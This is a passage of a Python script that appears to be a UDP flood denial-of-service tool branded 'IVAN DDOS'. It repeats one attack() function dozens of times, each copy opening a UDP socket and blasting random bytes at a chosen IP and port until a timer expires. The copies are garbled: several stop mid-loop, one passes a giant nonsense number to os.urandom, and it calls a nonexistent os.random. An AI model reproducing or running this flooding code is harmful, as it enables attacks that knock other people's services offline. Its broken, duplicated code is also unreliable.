        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
